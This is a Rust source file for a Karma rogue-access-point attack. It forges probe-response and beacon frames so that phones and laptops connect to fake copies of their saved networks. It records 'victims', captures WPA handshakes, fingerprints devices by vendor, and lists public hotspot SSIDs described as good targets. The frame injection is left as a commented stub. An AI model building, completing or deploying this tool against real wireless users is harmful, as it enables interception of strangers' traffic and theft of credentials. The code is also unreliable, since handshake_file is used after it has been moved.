//! Karma Attack Module
//! 
//! Responds to ALL probe requests with matching responses,
//! capturing devices looking for known networks.
//! 
//! This is highly effective against devices with saved networks.

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{Arc, Mutex, atomic::{AtomicBool, Ordering}};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

/// Karma attack configuration
#[derive(Debug, Clone)]
pub struct KarmaConfig {
    /// Interface to use (must support monitor + injection)
    pub interface: String,
    /// Duration in seconds (0 = indefinite)
    pub duration: u32,
    /// Channel to operate on (0 = hop)
    pub channel: u8,
    /// Whitelist - only respond to these SSIDs (empty = respond to all)
    pub ssid_whitelist: Vec<String>,
    /// Blacklist - never respond to these SSIDs
    pub ssid_blacklist: Vec<String>,
    /// Only target specific client MACs (empty = all clients)
    pub target_clients: Vec<String>,
    /// Capture handshakes when clients connect
    pub capture_handshakes: bool,
    /// Log all probe requests
    pub log_probes: bool,
    /// Output directory for captures
    pub output_dir: PathBuf,
    /// Use stealth MAC (randomize before attack)
    pub stealth_mac: bool,
}

impl Default for KarmaConfig {
    fn default() -> Self {
        Self {
            interface: "wlan0".to_string(),
            duration: 300, // 5 minutes
            channel: 6,
            ssid_whitelist: Vec::new(),
            ssid_blacklist: vec![
                // Default blacklist - don't impersonate these
                "".to_string(), // Hidden networks
            ],
            target_clients: Vec::new(),
            capture_handshakes: true,
            log_probes: true,
            output_dir: PathBuf::from("/tmp/karma"),
            stealth_mac: true,
        }
    }
}

/// A captured probe request
#[derive(Debug, Clone)]
pub struct CapturedProbe {
    /// Client MAC address
    pub client_mac: String,
    /// SSID the client is looking for
    pub ssid: String,
    /// Signal strength
    pub signal_dbm: i32,
    /// Timestamp
    pub timestamp: u64,
    /// Whether we responded
    pub responded: bool,
}

/// A client that connected to our fake AP
#[derive(Debug, Clone)]
pub struct KarmaVictim {
    /// Client MAC address
    pub client_mac: String,
    /// SSID they connected to
    pub ssid: String,
    /// Our fake BSSID for this SSID
    pub fake_bssid: String,
    /// Time of connection
    pub connected_at: u64,
    /// Whether we captured handshake
    pub handshake_captured: bool,
    /// Path to handshake file
    pub handshake_file: Option<PathBuf>,
    /// Device fingerprint if identified
    pub device_type: Option<String>,
}

/// Statistics from Karma attack
#[derive(Debug, Clone, Default)]
pub struct KarmaStats {
    /// Total probe requests seen
    pub probes_seen: u64,
    /// Probe requests we responded to
    pub probes_responded: u64,
    /// Unique SSIDs probed for
    pub unique_ssids: usize,
    /// Unique clients seen
    pub unique_clients: usize,
    /// Clients that connected
    pub victims: usize,
    /// Handshakes captured
    pub handshakes: usize,
    /// Duration so far
    pub duration_secs: u32,
}

/// Result of Karma attack
#[derive(Debug, Clone)]
pub struct KarmaResult {
    pub stats: KarmaStats,
    pub probes: Vec<CapturedProbe>,
    pub victims: Vec<KarmaVictim>,
    pub ssids_seen: Vec<String>,
    pub log_file: PathBuf,
}

/// Karma attack state
pub struct KarmaAttack {
    config: KarmaConfig,
    running: Arc<AtomicBool>,
    probes: Arc<Mutex<Vec<CapturedProbe>>>,
    victims: Arc<Mutex<Vec<KarmaVictim>>>,
    ssid_to_bssid: Arc<Mutex<HashMap<String, String>>>,
    stats: Arc<Mutex<KarmaStats>>,
}

impl KarmaAttack {
    pub fn new(config: KarmaConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            probes: Arc::new(Mutex::new(Vec::new())),
            victims: Arc::new(Mutex::new(Vec::new())),
            ssid_to_bssid: Arc::new(Mutex::new(HashMap::new())),
            stats: Arc::new(Mutex::new(KarmaStats::default())),
        }
    }
    
    /// Generate a random BSSID for a fake AP
    fn generate_bssid() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos() as u64;
        
        let mut state = seed;
        let mut bytes = [0u8; 6];
        for i in 0..6 {
            state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
            bytes[i] = (state >> 33) as u8;
        }
        
        // Set locally administered bit, clear multicast
        bytes[0] = (bytes[0] | 0x02) & 0xFE;
        
        format!("{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
            bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5])
    }
    
    /// Get or create a BSSID for an SSID
    fn get_bssid_for_ssid(&self, ssid: &str) -> String {
        let mut map = self.ssid_to_bssid.lock().unwrap();
        map.entry(ssid.to_string())
            .or_insert_with(Self::generate_bssid)
            .clone()
    }
    
    /// Check if we should respond to this probe
    fn should_respond(&self, ssid: &str, client_mac: &str) -> bool {
        // Check blacklist
        if self.config.ssid_blacklist.contains(&ssid.to_string()) {
            return false;
        }
        
        // Check whitelist (if not empty)
        if !self.config.ssid_whitelist.is_empty() {
            if !self.config.ssid_whitelist.contains(&ssid.to_string()) {
                return false;
            }
        }
        
        // Check target clients (if specified)
        if !self.config.target_clients.is_empty() {
            if !self.config.target_clients.iter().any(|c| 
                c.eq_ignore_ascii_case(client_mac)) {
                return false;
            }
        }
        
        true
    }
    
    /// Build a probe response frame
    fn build_probe_response(&self, ssid: &str, client_mac: &str) -> Vec<u8> {
        let bssid = self.get_bssid_for_ssid(ssid);
        
        // Parse MACs
        let client_bytes = Self::parse_mac(client_mac);
        let bssid_bytes = Self::parse_mac(&bssid);
        
        let mut frame = Vec::with_capacity(256);
        
        // Radiotap header (minimal)
        frame.extend_from_slice(&[
            0x00, 0x00, // version
            0x08, 0x00, // header length
            0x00, 0x00, 0x00, 0x00, // present flags
        ]);
        
        // Frame Control: Probe Response (subtype 5)
        frame.extend_from_slice(&[0x50, 0x00]);
        
        // Duration
        frame.extend_from_slice(&[0x00, 0x00]);
        
        // Destination (client)
        frame.extend_from_slice(&client_bytes);
        
        // Source (our BSSID)
        frame.extend_from_slice(&bssid_bytes);
        
        // BSSID
        frame.extend_from_slice(&bssid_bytes);
        
        // Sequence control
        frame.extend_from_slice(&[0x00, 0x00]);
        
        // Fixed parameters (12 bytes)
        // Timestamp (8 bytes)
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_micros() as u64;
        frame.extend_from_slice(&timestamp.to_le_bytes());
        
        // Beacon interval (2 bytes) - 100 TU
        frame.extend_from_slice(&[0x64, 0x00]);
        
        // Capabilities (2 bytes) - ESS, Privacy
        frame.extend_from_slice(&[0x11, 0x04]);
        
        // Tagged parameters
        
        // SSID
        frame.push(0x00); // Tag: SSID
        frame.push(ssid.len() as u8);
        frame.extend_from_slice(ssid.as_bytes());
        
        // Supported rates
        frame.extend_from_slice(&[
            0x01, 0x08, // Tag: Supported Rates, Length: 8
            0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24
        ]);
        
        // DS Parameter Set (channel)
        frame.extend_from_slice(&[
            0x03, 0x01, // Tag: DS Parameter Set, Length: 1
            self.config.channel
        ]);
        
        // RSN (WPA2)
        frame.extend_from_slice(&[
            0x30, 0x14, // Tag: RSN, Length: 20
            0x01, 0x00, // Version 1
            0x00, 0x0f, 0xac, 0x04, // Group cipher: CCMP
            0x01, 0x00, // Pairwise cipher count: 1
            0x00, 0x0f, 0xac, 0x04, // Pairwise cipher: CCMP
            0x01, 0x00, // Auth key mgmt count: 1
            0x00, 0x0f, 0xac, 0x02, // Auth: PSK
            0x00, 0x00, // RSN capabilities
        ]);
        
        frame
    }
    
    /// Build a beacon frame for an SSID
    fn build_beacon(&self, ssid: &str) -> Vec<u8> {
        let bssid = self.get_bssid_for_ssid(ssid);
        let bssid_bytes = Self::parse_mac(&bssid);
        
        let mut frame = Vec::with_capacity(256);
        
        // Radiotap header
        frame.extend_from_slice(&[
            0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
        ]);
        
        // Frame Control: Beacon (subtype 8)
        frame.extend_from_slice(&[0x80, 0x00]);
        
        // Duration
        frame.extend_from_slice(&[0x00, 0x00]);
        
        // Destination (broadcast)
        frame.extend_from_slice(&[0xff, 0xff, 0xff, 0xff, 0xff, 0xff]);
        
        // Source (our BSSID)
        frame.extend_from_slice(&bssid_bytes);
        
        // BSSID
        frame.extend_from_slice(&bssid_bytes);
        
        // Sequence control
        frame.extend_from_slice(&[0x00, 0x00]);
        
        // Fixed parameters
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_micros() as u64;
        frame.extend_from_slice(&timestamp.to_le_bytes());
        frame.extend_from_slice(&[0x64, 0x00]); // Beacon interval
        frame.extend_from_slice(&[0x11, 0x04]); // Capabilities
        
        // SSID
        frame.push(0x00);
        frame.push(ssid.len() as u8);
        frame.extend_from_slice(ssid.as_bytes());
        
        // Supported rates
        frame.extend_from_slice(&[
            0x01, 0x08,
            0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24
        ]);
        
        // Channel
        frame.extend_from_slice(&[0x03, 0x01, self.config.channel]);
        
        frame
    }
    
    fn parse_mac(mac: &str) -> [u8; 6] {
        let mut bytes = [0u8; 6];
        let parts: Vec<&str> = mac.split(':').collect();
        for (i, part) in parts.iter().take(6).enumerate() {
            bytes[i] = u8::from_str_radix(part, 16).unwrap_or(0);
        }
        bytes
    }
    
    /// Fingerprint a device based on probe behavior
    fn fingerprint_device(&self, client_mac: &str, probes: &[String]) -> Option<String> {
        // OUI-based detection
        let oui = client_mac.get(0..8).unwrap_or("");
        
        let vendor = match oui.to_uppercase().as_str() {
            "F4:0F:24" | "A4:83:E7" | "AC:BC:32" => "Apple",
            "00:1A:8A" | "8C:F5:A3" | "CC:07:AB" => "Samsung",
            "F8:8F:CA" | "94:EB:2C" => "Google",
            "00:1E:67" | "8C:F1:12" => "Intel",
            _ => "Unknown",
        };
        
        // Probe pattern analysis
        let has_hidden = probes.iter().any(|p| p.is_empty());
        let probe_count = probes.len();
        
        let device_type = if vendor == "Apple" {
            if probe_count > 10 { "iPhone" }
            else { "MacBook/iPad" }
        } else if vendor == "Samsung" {
            "Android (Samsung)"
        } else if vendor == "Google" {
            "Android (Pixel)"
        } else {
            return None;
        };
        
        Some(device_type.to_string())
    }
    
    /// Handle a probe request
    pub fn handle_probe(&self, client_mac: &str, ssid: &str, signal_dbm: i32) {
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        
        let should_respond = self.should_respond(ssid, client_mac);
        
        // Record probe
        let probe = CapturedProbe {
            client_mac: client_mac.to_string(),
            ssid: ssid.to_string(),
            signal_dbm,
            timestamp,
            responded: should_respond,
        };
        
        if self.config.log_probes {
            self.probes.lock().unwrap().push(probe);
        }
        
        // Update stats
        {
            let mut stats = self.stats.lock().unwrap();
            stats.probes_seen += 1;
            if should_respond {
                stats.probes_responded += 1;
            }
        }
        
        // Respond if appropriate
        if should_respond && !ssid.is_empty() {
            // In real implementation, this would inject the probe response
            // self.inject_probe_response(ssid, client_mac);
        }
    }
    
    /// Record a victim connection
    pub fn record_victim(&self, client_mac: &str, ssid: &str, handshake_file: Option<PathBuf>) {
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        
        // Get probes from this client for fingerprinting
        let probes: Vec<String> = self.probes.lock().unwrap()
            .iter()
            .filter(|p| p.client_mac == client_mac)
            .map(|p| p.ssid.clone())
            .collect();
        
        let device_type = self.fingerprint_device(client_mac, &probes);
        
        let victim = KarmaVictim {
            client_mac: client_mac.to_string(),
            ssid: ssid.to_string(),
            fake_bssid: self.get_bssid_for_ssid(ssid),
            connected_at: timestamp,
            handshake_captured: handshake_file.is_some(),
            handshake_file,
            device_type,
        };
        
        self.victims.lock().unwrap().push(victim);
        
        let mut stats = self.stats.lock().unwrap();
        stats.victims += 1;
        if handshake_file.is_some() {
            stats.handshakes += 1;
        }
    }
    
    /// Get current statistics
    pub fn get_stats(&self) -> KarmaStats {
        let mut stats = self.stats.lock().unwrap().clone();
        
        // Update unique counts
        let probes = self.probes.lock().unwrap();
        let unique_ssids: std::collections::HashSet<_> = probes.iter()
            .map(|p| &p.ssid)
            .collect();
        let unique_clients: std::collections::HashSet<_> = probes.iter()
            .map(|p| &p.client_mac)
            .collect();
        
        stats.unique_ssids = unique_ssids.len();
        stats.unique_clients = unique_clients.len();
        
        stats
    }
    
    /// Get result summary
    pub fn get_result(&self) -> KarmaResult {
        let probes = self.probes.lock().unwrap().clone();
        let victims = self.victims.lock().unwrap().clone();
        
        let ssids_seen: Vec<String> = {
            let mut ssids: std::collections::HashSet<String> = probes.iter()
                .map(|p| p.ssid.clone())
                .collect();
            ssids.into_iter().collect()
        };
        
        KarmaResult {
            stats: self.get_stats(),
            probes,
            victims,
            ssids_seen,
            log_file: self.config.output_dir.join("karma_log.txt"),
        }
    }
    
    /// Check if attack is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
    
    /// Stop the attack
    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

/// Quick function to start a Karma attack
pub fn start_karma(config: KarmaConfig) -> KarmaAttack {
    KarmaAttack::new(config)
}

/// List of commonly probed SSIDs that are good Karma targets
pub fn common_target_ssids() -> Vec<&'static str> {
    vec![
        "attwifi",
        "xfinity",
        "XFINITY",
        "Starbucks WiFi",
        "Google Starbucks",
        "McDonald's Free WiFi",
        "BTWifi-with-FON",
        "AndroidAP",
        "iPhone",
        "_Free_WiFi",
        "FreeWifi",
        "Guest",
        "NETGEAR",
        "linksys",
        "default",
        "HOME-",
        "DIRECT-",
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_bssid_generation() {
        let bssid = KarmaAttack::generate_bssid();
        assert_eq!(bssid.len(), 17);
        assert_eq!(bssid.matches(':').count(), 5);
        
        // Check locally administered bit
        let first_byte = u8::from_str_radix(&bssid[0..2], 16).unwrap();
        assert!(first_byte & 0x02 != 0);
    }
    
    #[test]
    fn test_should_respond_blacklist() {
        let mut config = KarmaConfig::default();
        config.ssid_blacklist.push("BlockedNetwork".to_string());
        
        let attack = KarmaAttack::new(config);
        
        assert!(!attack.should_respond("BlockedNetwork", "AA:BB:CC:DD:EE:FF"));
        assert!(attack.should_respond("AllowedNetwork", "AA:BB:CC:DD:EE:FF"));
    }
    
    #[test]
    fn test_should_respond_whitelist() {
        let mut config = KarmaConfig::default();
        config.ssid_whitelist.push("TargetNetwork".to_string());
        
        let attack = KarmaAttack::new(config);
        
        assert!(attack.should_respond("TargetNetwork", "AA:BB:CC:DD:EE:FF"));
        assert!(!attack.should_respond("OtherNetwork", "AA:BB:CC:DD:EE:FF"));
    }
}
